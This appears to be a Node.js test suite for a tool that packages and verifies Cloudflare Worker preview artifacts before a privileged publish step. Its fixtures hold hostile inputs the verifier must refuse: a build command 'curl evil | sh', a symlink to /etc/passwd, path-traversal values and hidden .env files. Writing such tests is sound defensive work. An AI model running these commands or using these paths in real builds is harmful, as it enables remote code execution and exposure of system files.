import test from 'node:test';
import assert from 'node:assert/strict';
import { mkdtempSync, mkdirSync, writeFileSync, readFileSync, symlinkSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { artifactBase, artifactName, packageArtifact, verifyArtifact, rewriteConfig, structuralProblems, filesDigest, bundleEntryFor, configMode } from '../../actions/cf-preview/artifact.mjs';

const SHA = (c) => c.repeat(40);
const ID = { repository: 'o/r', app: 'blog', target: 'preview', driver: 'native-preview', slot: 'native-branch', run_id: '77', run_attempt: '1',
  source_sha: SHA('a'), tested_sha: SHA('b'), artifact_sha: SHA('b'), target_url: 'https://pr-4-blog.x.workers.dev', config_mode: 'effective', worker_name: 'blog' };
const EXPECT = { repository: 'o/r', app: 'blog', target: 'preview', driver: 'native-preview', slot: 'native-branch', runId: '77', runAttempt: '1', sourceSha: SHA('a'), testedSha: SHA('b'), targetUrl: 'https://pr-4-blog.x.workers.dev' };

// An application tree as the Build job leaves it: adapter-generated config in dist/server, bundle from `wrangler deploy --dry-run --outdir`, assets in dist/client.
const fixture = () => {
  const ws = mkdtempSync(join(tmpdir(), 'art-'));
  mkdirSync(join(ws, 'dist/server'), { recursive: true }); mkdirSync(join(ws, 'dist/client'), { recursive: true }); mkdirSync(join(ws, 'bundle'));
  writeFileSync(join(ws, 'dist/client/index.html'), 'hi');
  writeFileSync(join(ws, 'bundle/entry.mjs'), 'export default {fetch(){return new Response("ok")}}');
  writeFileSync(join(ws, 'bundle/README.md'), 'generated');
  const cfg = { name: 'blog', main: 'entry.mjs', compatibility_date: '2025-01-01', assets: { directory: '../client' }, build: { command: 'curl evil | sh' },
    d1_databases: [{ binding: 'DB', database_name: 'd', database_id: 'ID1' }] };
  return { ws, cfg, dest: join(ws, 'artifact') };
};
const pack = (f, manifest = ID) => packageArtifact({ cfg: f.cfg, configDir: join(f.ws, 'dist/server'), workspace: f.ws, bundleDir: join(f.ws, 'bundle'), dest: f.dest, manifest, effectiveMain: 'entry.mjs' });

test('package: rewrites main/assets, drops build, forces no_bundle, copies assets, writes a digest-bound manifest', () => {
  const f = fixture();
  const m = pack(f);
  const cfg = JSON.parse(readFileSync(join(f.dest, 'wrangler.json'), 'utf8'));
  assert.deepEqual([cfg.main, cfg.assets.directory, cfg.no_bundle, 'build' in cfg], ['worker/entry.mjs', './assets/0', true, false]);
  assert.equal(readFileSync(join(f.dest, 'assets/0/index.html'), 'utf8'), 'hi');
  assert.equal(m.files_digest, filesDigest(f.dest));
  assert.equal(verifyArtifact(f.dest, EXPECT).manifest.artifact_sha, SHA('b'));
});

test('verify: every identity mismatch is refused before anything is published', () => {
  const f = fixture(); pack(f);
  for (const [k, v] of Object.entries({ repository: 'o/other', app: 'other', target: 'dev', driver: 'worker', slot: 'persistent-dev', runId: '78', runAttempt: '2', sourceSha: SHA('c'), testedSha: SHA('c'), targetUrl: 'https://pr-5-blog.x.workers.dev' })) {
    assert.throws(() => verifyArtifact(f.dest, { ...EXPECT, [k]: v }), /refusing to publish/, k);
  }
});
test('verify: an artifact built from another revision than the tested one is refused (artifact_sha must equal tested_sha)', () => {
  const f = fixture(); pack(f, { ...ID, artifact_sha: SHA('a') });
  assert.throws(() => verifyArtifact(f.dest, EXPECT), /artifact_sha/);
});
test('verify: modified, added or removed content fails the digest; symlinks are refused', () => {
  let f = fixture(); pack(f);
  writeFileSync(join(f.dest, 'worker/entry.mjs'), 'evil');
  assert.throws(() => verifyArtifact(f.dest, EXPECT), /recorded digest/);
  f = fixture(); pack(f);
  writeFileSync(join(f.dest, 'worker/extra.mjs'), 'x');
  assert.throws(() => verifyArtifact(f.dest, EXPECT), /recorded digest/);
  f = fixture(); pack(f);
  symlinkSync('/etc/passwd', join(f.dest, 'assets/0/link'));
  assert.throws(() => verifyArtifact(f.dest, EXPECT), /symbolic link/);
  f = fixture(); pack(f); rmSync(join(f.dest, 'manifest.json'));
  assert.throws(() => verifyArtifact(f.dest, EXPECT), /no artifact manifest/);
});
test('verify: a forged config (even with a recomputed digest) is rejected by the structural rules', () => {
  const f = fixture(); pack(f);
  const forge = (mut) => {
    const g = fixture(); pack(g);
    const p = join(g.dest, 'wrangler.json'); const c = JSON.parse(readFileSync(p, 'utf8')); mut(c); writeFileSync(p, JSON.stringify(c));
    const mp = join(g.dest, 'manifest.json'); const m = JSON.parse(readFileSync(mp, 'utf8')); m.files_digest = filesDigest(g.dest); writeFileSync(mp, JSON.stringify(m));
    return g.dest;
  };
  assert.throws(() => verifyArtifact(forge((c) => { c.build = { command: 'x' }; }), EXPECT), /build/);
  assert.throws(() => verifyArtifact(forge((c) => { c.no_bundle = false; }), EXPECT), /no_bundle/);
  assert.throws(() => verifyArtifact(forge((c) => { c.main = '../../etc/x.js'; }), EXPECT), /bundled file/);
  assert.throws(() => verifyArtifact(forge((c) => { c.main = 'src/index.ts'; }), EXPECT), /bundled file/);
  assert.throws(() => verifyArtifact(forge((c) => { c.assets.directory = '/'; }), EXPECT), /assets directory/);
  assert.throws(() => verifyArtifact(forge((c) => { c.env = { dev: { main: 'worker/missing.js' } }; }), EXPECT), /bundled file/);
  assert.throws(() => verifyArtifact(forge((c) => { c.site = { bucket: '.' }; }), EXPECT), /site/);
  assert.throws(() => verifyArtifact(forge((c) => { c.containers = [{ image: './Dockerfile' }]; }), EXPECT), /containers/);
  assert.throws(() => verifyArtifact(forge((c) => { c.alias = { a: '/etc/x' }; }), EXPECT), /alias/);
  assert.throws(() => verifyArtifact(forge((c) => { c.env = { dev: { containers: [] } }; }), EXPECT), /containers/, 'forbidden keys are checked in every environment section');
  assert.doesNotThrow(() => verifyArtifact(f.dest, EXPECT));
});
test('rewrite: env sections are rewritten too; an assets directory outside the workspace is refused', () => {
  const cfg = { name: 'a', main: 'src/i.ts', assets: { directory: './public' }, env: { dev: { main: 'src/i.ts', build: { command: 'x' }, assets: { directory: './public' } } } };
  const { config, assetDirs } = rewriteConfig(cfg, { configDir: '/ws/app', bundleEntry: 'i.js', workspace: '/ws/app' });
  assert.deepEqual([config.main, config.env.dev.main, config.env.dev.assets.directory, 'build' in config.env.dev, assetDirs.length], ['worker/i.js', 'worker/i.js', './assets/0', false, 1], 'one shared dir');
  assert.throws(() => rewriteConfig({ ...cfg, assets: { directory: '../../etc' } }, { configDir: '/ws/app', bundleEntry: 'i.js', workspace: '/ws/app' }), /outside the application workspace/);
});
test('bundle entry: matches main by stem, else the single JS file, else refuses', () => {
  const d = mkdtempSync(join(tmpdir(), 'b-'));
  writeFileSync(join(d, 'index.js'), ''); writeFileSync(join(d, 'index.js.map'), ''); writeFileSync(join(d, 'chunk.js'), '');
  assert.equal(bundleEntryFor(d, 'src/index.ts'), 'index.js');
  assert.throws(() => bundleEntryFor(d, 'src/other.ts'), /cannot tell/);
  assert.deepEqual(structuralProblems({ name: 'x', no_bundle: true, main: 'worker/index.js' }, ['worker/index.js'], { workerName: 'y' }), ["Worker name 'x' is not the expected 'y'"]);
});

test('verify: only manifest.json, wrangler.json, worker/** and assets/** are allowed; hidden files are refused', () => {
  for (const extra of ['.env', 'worker/.dev.vars', 'assets/0/.env', 'package.json', 'node_modules/x.js']) {
    const f = fixture(); pack(f);
    mkdirSync(join(f.dest, extra.includes('/') ? extra.split('/').slice(0, -1).join('/') : '.'), { recursive: true });
    writeFileSync(join(f.dest, extra), 'x');
    // re-seal so only the surface rule can reject it
    const mp = join(f.dest, 'manifest.json'); const m = JSON.parse(readFileSync(mp, 'utf8')); m.files_digest = filesDigest(f.dest); writeFileSync(mp, JSON.stringify(m));
    assert.throws(() => verifyArtifact(f.dest, EXPECT), /unexpected file/, extra);
  }
});
test('config mode is derived by the privileged side from the packaged config, never from the manifest', () => {
  const dev = { target: 'dev', driver: 'worker', devEnv: 'dev' };
  assert.equal(configMode({ env: { dev: { name: 'x' } } }, dev), 'source');
  assert.equal(configMode({ env: { dev: { name: 'x' } } }, { ...dev, driver: 'native-preview' }), 'effective');
  assert.equal(configMode({ env: { dev: { name: 'x' } } }, { target: 'production', driver: 'worker' }), 'effective');
  assert.equal(configMode({ name: 'x' }, dev), 'effective');
  const f = fixture(); pack(f, { ...ID, config_mode: 'effective' });
  assert.equal(verifyArtifact(f.dest, EXPECT).mode, 'effective');
  assert.throws(() => pack(fixture(), { ...ID, config_mode: 'bogus' }), /config_mode/);
});
test('verify: the Production Worker name is pinned by the privileged side', () => {
  const f = fixture(); pack(f);
  assert.doesNotThrow(() => verifyArtifact(f.dest, { ...EXPECT, workerName: 'blog' }));
  assert.throws(() => verifyArtifact(f.dest, { ...EXPECT, workerName: 'other-prod-worker' }), /Worker name 'blog' is not the expected/);
});

test('artifact name: unique per repository, application and slot; one contract for Build / Migration / Publish', () => {
  const n = (o = {}) => artifactName(artifactBase({ repository: 'o/r', app: 'blog', slot: 'native-branch', ...o }), 77, 2);
  assert.match(n(), /^cfv2-o-r-blog-native-branch-[0-9a-f]{10}-77-2$/);
  const names = [n(), n({ app: 'shop' }), n({ slot: 'production' }), n({ repository: 'o/other' }), n({ app: 'blo/g' }), n({ app: 'blo-g' })];
  assert.equal(new Set(names).size, names.length, 'two applications of one monorepo (or two kinds of one app) in the same run never share a name');
  assert.match(n({ app: 'a/b c' }), /^[A-Za-z0-9._-]+$/, 'only characters GitHub accepts in an artifact name');
  assert.ok(n({ app: 'x'.repeat(500) }).length < 120);
});
test('verify: a partial re-run may use the artifact of an EARLIER attempt of this run, never a later one, an unrelated run or a non-attempt', () => {
  const f = fixture(); pack(f, { ...ID, run_attempt: '1' });
  const E = { ...EXPECT, runAttempt: '1', currentAttempt: '3' };
  assert.equal(verifyArtifact(f.dest, E).manifest.run_attempt, '1');
  assert.equal(verifyArtifact(f.dest, { ...E, currentAttempt: '1' }).manifest.run_attempt, '1');
  assert.throws(() => verifyArtifact(f.dest, { ...E, runAttempt: '2' }), /run_attempt/, 'manifest attempt differs from the attempt the Build job reports');
  const g = fixture(); pack(g, { ...ID, run_attempt: '4' });
  assert.throws(() => verifyArtifact(g.dest, { ...EXPECT, runAttempt: '4', currentAttempt: '3' }), /not an attempt/, 'an artifact from a LATER attempt cannot exist');
  for (const bad of ['0', 'x', '1.5', '']) assert.throws(() => verifyArtifact(f.dest, { ...E, runAttempt: bad }), /run_attempt|not an attempt/, bad);
  assert.throws(() => verifyArtifact(f.dest, { ...E, runId: '78' }), /run_id/, 'another run');
  assert.throws(() => verifyArtifact(f.dest, { ...E, app: 'other' }), /app/, 'another application');
  assert.throws(() => verifyArtifact(f.dest, { ...E, testedSha: SHA('c') }), /tested_sha/, 'another revision');
});
